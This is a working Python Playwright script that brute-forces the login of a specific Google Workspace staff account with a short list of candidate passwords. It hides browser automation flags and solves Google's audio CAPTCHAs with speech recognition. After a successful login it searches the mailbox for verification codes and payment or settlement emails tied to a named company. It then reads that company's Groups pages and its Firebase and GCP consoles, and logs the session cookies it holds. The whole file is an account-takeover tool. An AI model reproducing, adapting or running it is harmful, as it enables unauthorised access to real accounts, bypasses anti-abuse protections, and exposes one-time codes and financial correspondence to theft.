#!/usr/bin/env python3
"""Staff Workspace probe (runs on an independent egress). Read-only wrt Google.

usage: staffmail2.py EMAIL CANDFILE LABEL

Does: identifier-state probe -> password loop (audio-captcha solving) -> on success
read-only Gmail list searches + Groups + Firebase/GCP console peek.
Never opens a message (no read-marking), never sends/deletes, never changes settings.
Writes out/<LABEL>/res.json + txt/ + shots/.
"""
import sys, json, time, os, re, random
from collections import Counter
from urllib.parse import quote
from playwright.sync_api import sync_playwright
import miniaudio, numpy as np

EMAIL, CAND_FILE, LABEL = sys.argv[1], sys.argv[2], sys.argv[3]
OUT = f"out/{LABEL}"
os.makedirs(OUT + "/shots", exist_ok=True)
os.makedirs(OUT + "/audio", exist_ok=True)
os.makedirs(OUT + "/txt", exist_ok=True)

PW_LIST = []
for line in open(CAND_FILE):
    line = line.strip()
    if not line or line.startswith("#"):
        continue
    parts = line.split("\t")
    if len(parts) >= 2 and parts[0].strip().lower() == EMAIL.lower():
        PW_LIST.append(parts[1])
    elif len(parts) == 1:
        PW_LIST.append(parts[0])
PW_LIST = PW_LIST[:8]

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
START = ("https://accounts.google.com/v3/signin/identifier?hl=en&flowName=GlifWebSignIn"
         "&flowEntry=ServiceLogin&continue=https%3A%2F%2Fmyaccount.google.com%2F&service=accountsettings")
steps, audio_log, results = [], [], []

def log(*a):
    print(*a, flush=True)

def txt(pg):
    try:
        return pg.evaluate("document.body?document.body.innerText:''") or ""
    except Exception:
        return ""

def save_txt(name, s):
    try:
        open(f"{OUT}/txt/{name}.txt", "w").write(s[:200000])
    except Exception:
        pass

def snap(pg, tag):
    t = re.sub(r'\n{3,}', '\n\n', txt(pg))[:4000]
    steps.append({"tag": tag, "url": pg.url, "text": t})
    save_txt(tag, txt(pg))
    try:
        pg.screenshot(path=f"{OUT}/shots/{LABEL}_{tag}.png", full_page=False)
    except Exception:
        pass
    log(f"[{LABEL}:{tag}] {pg.url[:90]} | {t[:240].replace(chr(10),' | ')}")

def captcha(t):
    t = t.lower()
    return ("type the text you hear or see" in t) or ("unusual traffic" in t) or \
           ("please re-enter the characters" in t) or ("type the text you hear" in t)

def classify(t, url):
    tl = t.replace("\u2019", "'").lower()
    if "couldn't find your google account" in tl or "couldn't find this account" in tl \
       or "that account doesn't exist" in tl or "account doesn't exist" in tl:
        return "ACCOUNT_NOT_FOUND"
    if "may not be secure" in tl or "browser or app" in tl:
        return "NOT_SECURE"
    if "wrong password" in tl:
        return "WRONG_PASSWORD"
    if captcha(tl):
        return "CAPTCHA"
    for k in ["2-step verification", "verify it's you", "verify it is you", "enter a code",
              "tap yes", "check your phone", "couldn't verify", "verify your identity",
              "choose how you want to sign in", "get a verification code", "is this your account",
              "first verify", "confirm your recovery", "passkey", "use your passkey",
              "enter the code", "check your email"]:
        if k in tl:
            return "2SV_OR_CHALLENGE"
    if url.startswith("https://myaccount.google.com") or "mail.google.com/mail/u/0" in url:
        return "SUCCESS"
    if "enter your password" in tl:
        return "PASSWORD_PAGE"
    return "UNKNOWN"

def human_fill(el, s):
    el.click(); time.sleep(0.15)
    for ch in s:
        el.type(ch, delay=random.randint(40, 100))
    time.sleep(0.2)

def click_next(pg):
    for el in pg.locator('button').all():
        try:
            if (el.inner_text() or '').strip().lower() == 'next' and el.is_visible():
                el.click(); return True
        except Exception:
            pass
    return False

NUM = {"zero":"0","oh":"0","o":"0","one":"1","won":"1","two":"2","to":"2","too":"2","three":"3",
       "tree":"3","free":"3","four":"4","for":"4","fore":"4","five":"5","six":"6","sex":"6",
       "seven":"7","eight":"8","ate":"8","nine":"9"}

def normalize_digits(s):
    out = []
    for tok in re.findall(r"[a-z]+|\d+", s.lower()):
        if tok.isdigit():
            out.append(tok)
        elif tok in NUM:
            out.append(NUM[tok])
    return "".join(out)

_vosk = None
def vosk_digits(pcm_bytes):
    global _vosk
    from vosk import Model, KaldiRecognizer, SetLogLevel
    SetLogLevel(-1)
    if _vosk is None:
        _vosk = Model("/opt/vosk-model-small-en-us-0.15")
    r = KaldiRecognizer(_vosk, 16000, '["zero one two three four five six seven eight nine oh"]')
    r.SetWords(True)
    outs = []
    for i in range(0, len(pcm_bytes), 4000):
        if r.AcceptWaveform(pcm_bytes[i:i+4000]):
            outs.append(json.loads(r.Result()).get('text', ''))
    outs.append(json.loads(r.FinalResult()).get('text', ''))
    return " ".join(x for x in outs if x)

_wm = {}
def whisper_txt(pcm, model="tiny.en"):
    from faster_whisper import WhisperModel
    if model not in _wm:
        _wm[model] = WhisperModel(model, device="cpu", compute_type="int8")
    segs, info = _wm[model].transcribe(pcm, language="en", beam_size=5)
    return [(round(s.start, 2), s.text) for s in segs]

def transcribe(path):
    data = open(path, "rb").read()
    try:
        dec = miniaudio.decode(data, output_format=miniaudio.SampleFormat.SIGNED16,
                              nchannels=1, sample_rate=16000)
    except Exception as e:
        return {"err": f"decode {e}", "cands": []}
    pcm = np.frombuffer(bytes(dec.samples), dtype=np.int16).astype(np.float32) / 32768.0
    dur = len(pcm) / 16000.0
    info = {"path": path, "bytes": len(data), "dur": round(dur, 2)}
    cands = []
    pcm_bytes = (pcm * 32767).astype(np.int16).tobytes()
    try:
        d = normalize_digits(vosk_digits(pcm_bytes))
        info["vosk"] = d
        if 4 <= len(d) <= 10:
            cands.append(d)
    except Exception as e:
        info["vosk_err"] = str(e)[:200]
    if not (4 <= len(info.get("vosk", "")) <= 10):
        try:
            segs = whisper_txt(pcm, "tiny.en")
            info["whisper"] = segs
            wtxt = " ".join(s[1] for s in segs)
            late = " ".join(s[1] for s in segs if s[0] > max(0, dur - 20))
            for src in (normalize_digits(late), normalize_digits(wtxt)):
                if 4 <= len(src) <= 10:
                    cands.append(src)
        except Exception as e:
            info["whisper_err"] = str(e)[:200]
    seen = []
    for c in cands:
        if c not in seen:
            seen.append(c)
    info["cands"] = seen[:6]
    return info

def audio_button(pg):
    sel = ['[aria-label*="Listen and type" i]', '#audioChal', 'button[aria-label*="audio" i]',
           '[role="button"][aria-label*="audio" i]', 'div[role="button"][aria-label*="Listen" i]',
           'button[title*="audio" i]', '[aria-label*="Get an audio challenge" i]']
    for s in sel:
        try:
            loc = pg.locator(s)
            if loc.count() > 0 and loc.first.is_visible():
                return loc.first, s
        except Exception:
            pass
    return None, None

def get_audio(pg, label, rnd):
    btn, sel = audio_button(pg)
    if btn is None:
        log(f"  [{label}] no audio button")
        return None
    seen = []
    def on_resp(r):
        try:
            ct = (r.headers or {}).get("content-type", "")
            if "audio" in ct or "audio" in r.url.lower():
                seen.append((r.url, ct, r.status))
        except Exception:
            pass
    pg.on("response", on_resp)
    try:
        btn.click()
    except Exception as e:
        log("  click err", e)
    pg.wait_for_timeout(2600)
    try:
        pg.remove_listener("response", on_resp)
    except Exception:
        pass
    log(f"  [{label}] audio btn={sel} resp={[(u[:80],c,s) for u,c,s in seen][:4]}")
    if not seen:
        for el in pg.locator("audio").all():
            try:
                src = el.get_attribute("src")
                if src:
                    seen.append((src, "audio/?", 200))
            except Exception:
                pass
    if not seen:
        return None
    url = seen[-1][0]
    if url.startswith("/"):
        url = "https://accounts.google.com" + url
    try:
        b = pg.request.get(url).body()
    except Exception as e:
        log("  dl err", e)
        return None
    fn = f"{OUT}/audio/{label}_r{rnd}.bin"
    open(fn, "wb").write(b)
    info = transcribe(fn)
    info["url"] = url[:200]
    audio_log.append(info)
    log(f"  [{label}] audio dur={info.get('dur')} cands={info.get('cands')}")
    return info

def solve_captcha(pg, label, rounds=4):
    for rnd in range(rounds):
        if not captcha(txt(pg)):
            return True
        if pg.locator('input[name="ca"]').count() == 0:
            log(f"  [{label}] captcha but no ca input")
            return False
        info = get_audio(pg, label, rnd)
        cands = (info or {}).get("cands") or []
        if not cands:
            log(f"  [{label}] no digit candidates")
            return False
        solved = False
        for cand in cands[:3]:
            ca = pg.locator('input[name="ca"]').first
            try:
                ca.fill("")
            except Exception:
                pass
            human_fill(ca, cand)
            click_next(pg)
            pg.wait_for_timeout(3400)
            if not captcha(txt(pg)):
                log(f"  [{label}] captcha SOLVED with {cand!r}")
                solved = True
                break
            log(f"  [{label}] captcha try {cand!r} rejected")
        if solved:
            return True
    return not captcha(txt(pg))

def has_pw_field(pg):
    try:
        return pg.locator('input[type="password"]:visible').count() > 0
    except Exception:
        return False

def reach_password(pg, label):
    for i in range(3):
        try:
            pg.goto(START, timeout=60000, wait_until="domcontentloaded")
        except Exception as e:
            log("goto err", e)
        pg.wait_for_timeout(2200)
        if pg.url.startswith("https://myaccount.google.com"):
            return "SUCCESS"
        if captcha(txt(pg)):
            solve_captcha(pg, f"{label}_pre{i}")
        if pg.locator('input[name="identifier"]').count():
            human_fill(pg.locator('input[name="identifier"]').first, EMAIL)
            click_next(pg)
            pg.wait_for_timeout(4200)
        for r in range(3):
            if not captcha(txt(pg)):
                break
            solve_captcha(pg, f"{label}_post{i}_{r}")
        snap(pg, f"id_{i}")
        v = classify(txt(pg), pg.url)
        if v in ("ACCOUNT_NOT_FOUND", "NOT_SECURE", "SUCCESS"):
            return v
        if has_pw_field(pg):
            return "PASSWORD_PAGE"
        if v == "2SV_OR_CHALLENGE":
            return v
    return "UNKNOWN"

def gmail_searches(pg):
    out = {}
    try:
        pg.goto("https://mail.google.com/mail/u/0/#inbox", timeout=60000, wait_until="domcontentloaded")
        pg.wait_for_timeout(7000)
    except Exception as e:
        out["_inbox_err"] = str(e)[:200]
    snap(pg, "gmail_inbox")
    queries = [
        ("emmanuel", 'emmanuel OR thetonictech OR "login verification code"'),
        ("otp", 'subject:(code OR otp OR verification OR "sign-in" OR signin OR cardtonic)'),
        ("finance", 'paystack OR breet OR providus OR settlement OR payout OR recon OR invoice OR statement OR flutterwave'),
    ]
    for name, q in queries:
        try:
            box = pg.locator('input[aria-label*="Search mail" i], input[name="q"]')
            if box.count():
                b = box.first
                b.click()
                b.fill("")
                b.type(q, delay=15)
                b.press("Enter")
            else:
                pg.goto("https://mail.google.com/mail/u/0/#search/" + quote(q),
                        timeout=60000, wait_until="domcontentloaded")
            pg.wait_for_timeout(6500)
            t = txt(pg)
            out[name] = {"query": q, "url": pg.url, "text": re.sub(r'\n{3,}', '\n\n', t)[:12000]}
            snap(pg, f"gmail_{name}")
        except Exception as e:
            out[name] = {"query": q, "err": str(e)[:250]}
    return out

def groups_peek(pg):
    try:
        pg.goto("https://groups.google.com/a/thetonictech.com/", timeout=45000,
                wait_until="domcontentloaded")
        pg.wait_for_timeout(5000)
        t = txt(pg)
        snap(pg, "groups")
        return {"url": pg.url, "text": re.sub(r'\n{3,}', '\n\n', t)[:8000]}
    except Exception as e:
        return {"err": str(e)[:250]}

def console_peek(pg):
    out = {}
    for name, url in (("firebase", "https://console.firebase.google.com/"),
                      ("gcp", "https://console.cloud.google.com/")):
        try:
            pg.goto(url, timeout=45000, wait_until="domcontentloaded")
            pg.wait_for_timeout(6500)
            t = txt(pg)
            snap(pg, f"console_{name}")
            out[name] = {"url": pg.url, "text": re.sub(r'\n{3,}', '\n\n', t)[:6000]}
        except Exception as e:
            out[name] = {"err": str(e)[:250]}
    return out

res = {"email": EMAIL, "label": LABEL, "pw_list_len": len(PW_LIST), "verdict": None,
       "reach": None, "attempts": [], "steps": steps, "audio": audio_log,
       "gmail": {}, "groups": {}, "console": {}, "google_auth_cookies": []}

with sync_playwright() as p:
    ctx = p.chromium.launch_persistent_context(
        f"{OUT}/prof", headless=False, user_agent=UA, locale="en-US",
        timezone_id="Africa/Lagos", viewport={"width": 1366, "height": 800},
        args=["--disable-blink-features=AutomationControlled", "--no-sandbox",
              "--disable-dev-shm-usage", "--disable-gpu"])
    ctx.add_init_script(
        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
        "Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});"
        "if(!window.chrome){window.chrome={runtime:{}};}")
    pg = ctx.new_page()
    try:
        st = reach_password(pg, LABEL)
        res["reach"] = st
        if st == "SUCCESS":
            res["verdict"] = "SUCCESS"
        elif st == "PASSWORD_PAGE":
            for idx, pw in enumerate(PW_LIST):
                rec = {"idx": idx, "pw_hint": (pw[:2] + "***" + pw[-1:] if len(pw) > 3 else "***")}
                if captcha(txt(pg)):
                    solve_captcha(pg, f"{LABEL}_pwdpre{idx}")
                if not has_pw_field(pg):
                    rec["verdict"] = "NO_PW_FIELD:" + classify(txt(pg), pg.url)
                    res["attempts"].append(rec)
                    if classify(txt(pg), pg.url) in ("SUCCESS", "2SV_OR_CHALLENGE", "ACCOUNT_NOT_FOUND"):
                        break
                    pg.goto(START, timeout=60000, wait_until="domcontentloaded")
                    pg.wait_for_timeout(2000)
                    if pg.locator('input[name="identifier"]').count():
                        human_fill(pg.locator('input[name="identifier"]').first, EMAIL)
                        click_next(pg); pg.wait_for_timeout(4200)
                        for r in range(2):
                            if not captcha(txt(pg)):
                                break
                            solve_captcha(pg, f"{LABEL}_re{idx}_{r}")
                    continue
                human_fill(pg.locator('input[type="password"]:visible').first, pw)
                if captcha(txt(pg)):
                    solve_captcha(pg, f"{LABEL}_pwd{idx}")
                else:
                    if not click_next(pg):
                        try:
                            pg.locator('input[type="password"]:visible').first.press("Enter")
                        except Exception:
                            pass
                pg.wait_for_timeout(7000)
                for r in range(3):
                    if not captcha(txt(pg)):
                        break
                    if not solve_captcha(pg, f"{LABEL}_after{idx}_{r}"):
                        break
                    pg.wait_for_timeout(3500)
                snap(pg, f"pw_{idx}")
                v = classify(txt(pg), pg.url)
                rec["verdict"] = v
                rec["url"] = pg.url[:200]
                res["attempts"].append(rec)
                log(f"=== [{LABEL}] pw#{idx} -> {v}")
                if v == "SUCCESS":
                    res["verdict"] = "SUCCESS"
                    break
                if v in ("2SV_OR_CHALLENGE", "NOT_SECURE", "ACCOUNT_NOT_FOUND"):
                    res["verdict"] = v
                    break
                if v == "CAPTCHA" and not captcha(txt(pg)):
                    pass
            if res["verdict"] is None:
                res["verdict"] = res["attempts"][-1]["verdict"] if res["attempts"] else "NO_ATTEMPTS"
            if res["verdict"] == "WRONG_PASSWORD":
                try:
                    pg.goto("https://accounts.google.com/signin/recovery?hl=en",
                            timeout=60000, wait_until="domcontentloaded")
                    pg.wait_for_timeout(5500)
                    if captcha(txt(pg)):
                        solve_captcha(pg, f"{LABEL}_recov")
                    snap(pg, "recovery")
                    res["recovery_page"] = {"url": pg.url,
                                            "text": re.sub(r'\n{3,}', '\n\n', txt(pg))[:5000]}
                except Exception as e:
                    res["recovery_page"] = {"err": str(e)[:250]}
        else:
            res["verdict"] = st

        if res["verdict"] == "SUCCESS":
            try:
                res["gmail"] = gmail_searches(pg)
            except Exception as e:
                res["gmail"] = {"err": str(e)[:300]}
            res["groups"] = groups_peek(pg)
            res["console"] = console_peek(pg)
    except Exception as e:
        res["error"] = f"{type(e).__name__}: {str(e)[:400]}"
        try:
            snap(pg, "err")
        except Exception:
            pass
    try:
        cks = [c["name"] for c in ctx.cookies()]
        res["google_auth_cookies"] = sorted(
            c for c in cks if c in ("SID", "HSID", "SSID", "APISID", "SAPISID",
                                    "__Secure-1PSID", "__Secure-3PSID", "SIDCC", "LOGIN_INFO"))
    except Exception:
        pass
    try:
        ctx.close()
    except Exception:
        pass

json.dump(res, open(f"{OUT}/res.json", "w"), indent=1)
log(f"=== {LABEL} VERDICT: {res['verdict']} | attempts={len(res['attempts'])} | cookies={res.get('google_auth_cookies')}")
